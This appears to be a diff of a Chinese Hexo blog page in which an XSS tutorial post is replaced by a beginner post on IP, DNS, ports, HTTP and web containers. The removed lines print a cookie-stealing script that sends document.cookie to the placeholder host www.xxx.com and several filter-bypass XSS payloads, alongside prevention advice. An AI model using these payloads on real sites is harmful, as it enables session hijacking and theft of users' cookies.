@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="XSS攻击, Hbluewhite的Blog">
+    <meta name="keywords" content="Web服务器通讯原理, Hbluewhite的Blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>XSS攻击 | Hbluewhite的Blog</title>
+    <title>Web服务器通讯原理 | Hbluewhite的Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -356,12 +356,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">XSS攻击</h1>
+                    <h1 class="description center-align post-title">Web服务器通讯原理</h1>
                 </div>
             </div>
         </div>
@@ -477,8 +477,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">web漏洞</span>
+                            <a href="/tags/Web/">
+                                <span class="chip bg-color">Web</span>
                             </a>
                         
                     </div>
@@ -514,34 +514,92 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h1><h2 id="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"><a href="#定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。" class="headerlink" title="定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。"></a>定义：xss攻击通常指的是利用网页开发时留下的漏洞，通过巧妙的方法注入恶意的指令代码到网页，使用户加载并执行攻击者恶意执照的程序。网页的恶意程序通常是JavaScript，也有Java、VBScript、ActiveX、Flash甚至是普通的html。</h2><h2 id="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"><a href="#危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。" class="headerlink" title="危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。"></a>危害：劫持用户通话、插入恶意内容、重定向用户、使用恶意软件劫持用户浏览器、繁殖xss蠕虫，甚至破坏网站、修改路由器配置信息。</h2><h2 id="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"><a href="#原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’-lt-’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。" class="headerlink" title="原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如与之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。"></a>原理：HTML是一种超文本语言，通过将一些字符特殊地对待来区别文本和标记，例如<title>与</title>之间的字符是页面的标题等等。当插入’&lt;’符号时会默认为html的标签，在其中写入JavaScript的脚本，将会被用户浏览器所执行。使用，当这些特殊字符不被当动态页面检查或者检查出现失误后，就会产生xss漏洞。</h2><h3 id="例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com"><a href="#例如：用户通过访问url-http-127-0-0-1-name-abc-就会在浏览器输入如下信息-hello-abc-如果我们传递这样的一个url-http-127-0-0-1-name-60-script-62-alert-39-abc-xss-39-60-script-62-这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url-url-http-127-0-0-1-name-60-script-62-document-location-href-’http-www-xxx-com-cookie-39-document-cookie-60-script-gt-这样类似的代码就会将当前的cookie发送到指定的站点：www-xxx-com" class="headerlink" title="例如：用户通过访问url:http://127.0.0.1/?name=abc,就会在浏览器输入如下信息: hello abc,如果我们传递这样的一个url:http://127.0.0.1/?name= &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:http://127.0.0.1/?name= &#60; script&#62;document.location.href=’http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/"></a>例如：用户通过访问url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=abc,%E5%B0%B1%E4%BC%9A%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E5%A6%82%E4%B8%8B%E4%BF%A1%E6%81%AF">http://127.0.0.1/?name=abc,就会在浏览器输入如下信息</a>: <strong>hello abc</strong>,如果我们传递这样的一个url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;alert(&#39;abc,xss&#39;)&#60;/script&#62;这时你就会发现弹出一个弹出框，这说明站点已经存在xss漏洞。那么恶意用户如何盗取cookie呢？与上面类似先写这样的一个url: url:<a target="_blank" rel="noopener" href="http://127.0.0.1/?name=">http://127.0.0.1/?name=</a> &#60; script&#62;document.location.href=’<a target="_blank" rel="noopener" href="http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,%E8%BF%99%E6%A0%B7%E7%B1%BB%E4%BC%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E5%B0%B1%E4%BC%9A%E5%B0%86%E5%BD%93%E5%89%8D%E7%9A%84cookie%E5%8F%91%E9%80%81%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%99%E7%82%B9%EF%BC%9Awww.xxx.com/">http://www.xxx.com/cookie?&#39;+document.cookie&#60;/script&gt;,这样类似的代码就会将当前的cookie发送到指定的站点：www.xxx.com/</a></h3><h2 id="类型-从攻击代码的工作方式可以分为三个类型"><a href="#类型-从攻击代码的工作方式可以分为三个类型" class="headerlink" title="类型:从攻击代码的工作方式可以分为三个类型"></a>类型:从攻击代码的工作方式可以分为三个类型</h2><ol>
-<li>持久性跨站：最直接的危害类型，跨站代码存储在服务器中。存储型：主要让用户输入数据。其他用户浏览查看的地方，例如留言、评论、博客、日志等表单。过程：浏览器-后端-浏览器</li>
-<li>非持久性跨站：反射性跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。过程：浏览器-后端-数据库-后端-浏览器</li>
-<li>DOM跨站（DOM XSS）：DOM（文档对象模型），客户端脚本处理逻辑导致的安全问题。是指受害者端的页面脚本在修改本地页面DOM环境是未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果的差异的原因是对本地DOM的恶意篡改利用。过程：url-浏览器</li>
+                <h1 id="Web服务器通讯原理"><a href="#Web服务器通讯原理" class="headerlink" title="Web服务器通讯原理"></a>Web服务器通讯原理</h1><ol>
+<li><strong>IP</strong></li>
 </ol>
-<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>常见的xss的攻击手段和目的：</p>
+<ul>
+<li>正统定义：互联网协议地址。</li>
+<li>可以俗气的理解成：ip实际上就是地址，如果我想到你家去找你玩，就要知道你家住在哪里，ip就是你电脑的地址，在网络上可以通过ip来访问你的计算机。</li>
+</ul>
+<p>图片关系<img src="https://img-blog.csdnimg.cn/20200625114421863.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="IP关系"></p>
+<ol start="2">
+<li><strong>域名</strong></li>
+</ol>
+<ul>
+<li>域名实际上是为了人们方便记忆而创造的一个字符型标识。</li>
+</ul>
+<ol start="3">
+<li><strong>DNS</strong></li>
+</ol>
+<ul>
+<li><p>DNS是将域名转化为IP的一个网络协议.</p>
+</li>
+<li><p>通俗理解为ip是计算机所理解的语言，为了方便人们记忆有了域名，而DNS是把域名连接到ip的一个方法。</p>
+</li>
+</ul>
+<ol start="4">
+<li><strong>端口</strong></li>
+</ol>
+<ul>
+<li>端口主要是网络接口，类似于电脑的接口比如你去访问别人的网站，一般来说实际上你是去他的80端口进行通信<br>0端口是预留端口，一般不会用到。</li>
+</ul>
+<ol start="5">
+<li><strong>HTTP协议</strong></li>
+</ol>
+<ul>
+<li>HTTP协议也叫超文本传输协议，是互联网上应用最为广泛的一种网络协议。<br>https比http多了一个叫做证书的东西，目的是为了防止中途截取。</li>
+</ul>
+<h2 id="从访客的角度看网页浏览流程"><a href="#从访客的角度看网页浏览流程" class="headerlink" title="从访客的角度看网页浏览流程"></a>从访客的角度看网页浏览流程</h2><ol>
+<li><strong>用户浏览器输入协议：//域名。</strong><pre><code>例如：http：//baidu.cn/
+</code></pre>
+</li>
+<li><strong>用户浏览器通过系统向DNS查询域名对应的ip地址。</strong></li>
+<li><strong>用户浏览器向查询到的IP地址发起http请求。</strong></li>
+<li><strong>服务器解析用户请求，从中提取数据，处理后向用户返回一个http相应。</strong></li>
+<li><strong>浏览器收到响应后提取状态，协议编码，正文的有效信息，然后翻译成人们可以看懂的图形界面并显示。</strong></li>
+</ol>
+<h2 id="常见的服务器系统"><a href="#常见的服务器系统" class="headerlink" title="常见的服务器系统"></a>常见的服务器系统</h2><p><img src="https://img-blog.csdnimg.cn/20200625114559839.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片解释"></p>
 <ol>
-<li>盗用cookie,获取敏感信息。</li>
-<li>利用植入Flash,通过crossdomain权限设置进一步获取更高权限，或者利用Java等此类的操作。</li>
-<li>利用iframe、frame、XMLHttpRequest或者上述flash等方式，以用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
-<li>利用可被攻击的域收到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
-<li>在访问极大的一些页面上的xss可以攻击游戏额小型的网站，实现DDoS攻击效果</li>
+<li><strong>Windows系统与Linux系统的区别</strong></li>
 </ol>
-<h2 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h2><ol>
-<li>可以用**/**代替空格。</li>
-<li>运用大小写绕过：&lt;imGRC=xonerRo=alert(“xss”)&gt;</li>
-<li><strong>双写关键词</strong>：&lt;imimggsrsrcc=xonerror=alert(“xss”)&gt;</li>
-<li><strong>利用eval字符拼接</strong>：&lt;imgsrc=”x” onerror=”a=alert;b=’(xss);’ ;eval(a+b+c)”&gt;</li>
-<li><strong>利用top</strong>：<script>top<a href="%E2%80%99xss%E2%80%98">"al"+"ert"</a>;</script></li>
-<li>其他字符混淆：可以利用注释、标签的优先级：&lt;<script>alert("xss");//<</script>   2.<title>&lt;img src=</title>&gt;&lt;img src=x onerror=”alert(“xss”);”&gt; 因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效 </li>
-<li>编码绕过: Unicode 编码绕过<strong>如果是在html中，我们可以不用应该好。绕过是在js中，我们可以通过反引号代替单双引号</strong>&lt;img src=”C:/Users/86182/Desktop/x” onerror=alert(<code>xss</code>);&gt; 当括号被过滤的时候我们可以使用throw来绕过&lt;svg/onload=”window.onerror=eval;throw’=alert\x281\x29’;”&gt;过滤</li>
+<ul>
+<li><p>Windows系统的路径： C：\Users\blackJone&gt;</p>
+</li>
+<li><p>Linux系统的路径： ：/etc/init#</p>
+</li>
+</ul>
+<ol start="2">
+<li><strong>绝对路径与相对路径</strong></li>
 </ol>
-<h2 id="预防xss"><a href="#预防xss" class="headerlink" title="预防xss"></a>预防xss</h2><ol>
-<li>过滤一些危险的字符，以及转义&amp;&lt;&gt;” ‘ /等危险的字符</li>
-<li>HTTP-only Cookie：禁止JavaScript读取某县敏感的Cookie，攻击者完成XSS后注入后也无法窃取Cookie</li>
-<li>设置CSP(Conrwnr Awxurity Policy)</li>
-<li>输入内容长短限制</li>
-</ol>
+<p><img src="https://img-blog.csdnimg.cn/20200625114249599.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片"></p>
+<ul>
+<li> 例如：文件”icon.jpg”存在img文件中。绝对路径为D:/wamp/www/img/icon.jpg。那么相对路径为 ./img/icon.jpg。</li>
+</ul>
+<h2 id="web的容器"><a href="#web的容器" class="headerlink" title="web的容器"></a>web的容器</h2><ul>
+<li> Web容器是可以向发出请求的浏览器发送文档的程序。是一种被动的程序，只有其他计算机发出请求时web容器才会相应。</li>
+<li> Web容器的主要功能是存储，处理和传递网页给用户，客户端和服务器之间使用http协议进行通信，交付的页面是HTML文档。</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20200625114627778.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc5MDY3NQ==,size_16,color_FFFFFF,t_70" alt="图片"></p>
+<p>常见的Web容器</p>
+<h2 id="公网和内网的区别"><a href="#公网和内网的区别" class="headerlink" title="公网和内网的区别"></a>公网和内网的区别</h2><table>
+<thead>
+<tr>
+<th></th>
+<th>公网</th>
+<th>内网</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>网段上的区别</td>
+<td>大部分ip地址均为公网。</td>
+<td>内网IP通常包括10.0.0<del>10.255.255.255,以及192.168.0.0</del>192.168.255.255等。</td>
+</tr>
+<tr>
+<td>网络可达性的区别</td>
+<td>外网IP网络提供商（ISP）服务器分配的全球唯一的IP地址，并且每个IP地址仅分配给一个网络设备。通过公网IP，用户无需经过路由器或交换机，可以直接连接internet。</td>
+<td>内网IP局域网，网线都是连接在同一个交换机上，因此IP地址是由交换机或者路由器进行分配，而且每一个IP也是有所不同，但此类IP地址只可以在局域网内访问，无法直接访问internet。如果要访问Internet，则需要通过NAT或者PROXY等技术交换，把内网IP和端口映射为公网的ip和端口，方可访问internet。</td>
+</tr>
+</tbody></table>
 
                 
             </div>
@@ -568,7 +626,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/08/21/XSS%E6%94%BB%E5%87%BB/">http://example.com/2021/08/21/XSS%E6%94%BB%E5%87%BB/</a>
+                    <a href="http://example.com/2021/08/21/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86/">http://example.com/2021/08/21/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E8%AE%AF%E5%8E%9F%E7%90%86/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -606,8 +664,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">web漏洞</span>
+                                <a href="/tags/Web/">
+                                    <span class="chip bg-color">Web</span>
                                 </a>
                             
                         </div>
@@ -1049,13 +1107,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/08/21/sql%E6%B3%A8%E5%85%A5/">
+                <a href="/2021/08/21/php%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.png" class="responsive-img" alt="sql注入基础">
+                        <img src="/medias/featureimages/6.png" class="responsive-img" alt="php基本语法">
                         
-                        <span class="card-title">sql注入基础</span>
+                        <span class="card-title">php基本语法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1079,8 +1137,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Web%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">Web漏洞</span>
+                    <a href="/tags/php/">
+                        <span class="chip bg-color">php</span>
                     </a>
                     
                 </div>
@@ -1094,13 +1152,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/20/RCE/">
+                <a href="/2021/08/21/sql%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.png" class="responsive-img" alt="欢迎来到Hbluewhite的博客">
+                        <img src="/medias/featureimages/14.png" class="responsive-img" alt="sql注入基础">
                         
-                        <span class="card-title">欢迎来到Hbluewhite的博客</span>
+                        <span class="card-title">sql注入基础</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1111,7 +1169,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-21
                             </span>
                         <span class="publish-author">
                             
